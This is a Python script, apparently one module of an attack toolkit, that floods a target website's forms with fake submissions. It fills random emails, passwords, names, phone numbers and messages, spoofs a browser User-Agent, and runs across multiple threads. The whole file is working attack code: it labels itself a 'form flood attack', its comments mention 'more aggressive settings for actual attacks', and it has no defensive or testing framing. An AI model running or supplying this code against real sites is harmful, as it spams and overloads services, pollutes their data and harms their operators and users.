import requests
import random
import string
from concurrent.futures import ThreadPoolExecutor
import time

def generate_random_string(length=8):
    """Generate a random string of lowercase letters."""
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

def generate_random_email():
    """Generate a random email address."""
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "protonmail.com", "tutanota.com"]
    username = generate_random_string(random.randint(5, 15))
    domain = random.choice(domains)
    return f"{username}@{domain}"

def generate_random_password(length=12):
    """Generate a random password."""
    chars = string.ascii_letters + string.digits + "!@#$%^&*()"
    return ''.join(random.choice(chars) for _ in range(length))

def generate_random_name():
    """Generate a random name."""
    first_names = ["John", "Jane", "Mike", "Sarah", "David", "Lisa", "Tom", "Emma", "Alex", "Maria"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
    return f"{random.choice(first_names)} {random.choice(last_names)}"

def submit_form(target_url, form_data, attempt_num):
    """Submit a form to the target URL."""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Connection': 'keep-alive',
        }
        
        response = requests.post(target_url, data=form_data, headers=headers, timeout=10)
        print(f"[+] Form {attempt_num}: Status {response.status_code} - Email: {form_data.get('email', 'N/A')}")
        return {"status": response.status_code, "success": True}
    except Exception as e:
        print(f"[!] Form {attempt_num} failed: {e}")
        return {"status": "ERROR", "success": False, "error": str(e)}

def flood_forms(target_url, num_requests=100, max_threads=10):
    """Flood the target URL with fake form submissions."""
    print(f"[+] Starting form flood attack on: {target_url}")
    print(f"[+] Sending {num_requests} requests using {max_threads} threads")
    
    # Common form field patterns
    form_fields = {
        "email": generate_random_email,
        "password": generate_random_password,
        "username": generate_random_string,
        "name": generate_random_name,
        "first_name": lambda: generate_random_name().split()[0],
        "last_name": lambda: generate_random_name().split()[1],
        "phone": lambda: f"+1{random.randint(100, 999)}{random.randint(100, 999)}{random.randint(1000, 9999)}",
        "company": lambda: f"Company_{generate_random_string(8)}",
        "message": lambda: f"Test message {generate_random_string(20)}",
        "subject": lambda: f"Test subject {generate_random_string(15)}"
    }
    
    successful_submissions = 0
    failed_submissions = 0
    
    def submit_single_form(attempt_num):
        nonlocal successful_submissions, failed_submissions
        
        # Randomly select 3-6 form fields to submit
        selected_fields = random.sample(list(form_fields.keys()), random.randint(3, min(6, len(form_fields))))
        form_data = {field: form_fields[field]() for field in selected_fields}
        
        result = submit_form(target_url, form_data, attempt_num)
        
        if result["success"]:
            successful_submissions += 1
        else:
            failed_submissions += 1
        
        return result
    
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [executor.submit(submit_single_form, i+1) for i in range(num_requests)]
        
        for future in futures:
            try:
                future.result()
            except Exception as e:
                print(f"[!] Thread execution error: {e}")
                failed_submissions += 1
    
    elapsed_time = time.time() - start_time
    
    print(f"\n[+] Form flood attack completed!")
    print(f"[+] Successful submissions: {successful_submissions}")
    print(f"[+] Failed submissions: {failed_submissions}")
    print(f"[+] Total time: {elapsed_time:.2f} seconds")
    print(f"[+] Average rate: {num_requests/elapsed_time:.2f} requests/second")
    
    return {
        "successful": successful_submissions,
        "failed": failed_submissions,
        "total_time": elapsed_time,
        "rate": num_requests/elapsed_time
    }

def run(url, log_file):
    """Run form flooding attack and log the results."""
    print(f"[+] Starting form flooding attack on: {url}")
    
    # More aggressive settings for actual attacks
    num_requests = 50  # Increased from 20
    max_threads = 8    # Increased from 5
    
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(f"[FormFlooding] Starting attack on: {url}\n")
        f.write(f"[FormFlooding] Configuration: {num_requests} requests, {max_threads} threads\n")
    
    try:
        result = flood_forms(url, num_requests=num_requests, max_threads=max_threads)
        
        # Log results
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"[FormFlooding] Attack completed\n")
            f.write(f"[FormFlooding] Results: {result}\n\n")
        
        return result
        
    except Exception as e:
        error_msg = f"Form flooding attack failed: {e}"
        print(f"[!] {error_msg}")
        
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"[FormFlooding] Error: {error_msg}\n\n")
        
        return {"error": error_msg}

if __name__ == "__main__":
    import sys
    url = sys.argv[1] if len(sys.argv) > 1 else input("Enter target URL: ")
    run(url, "formflood_attack.log")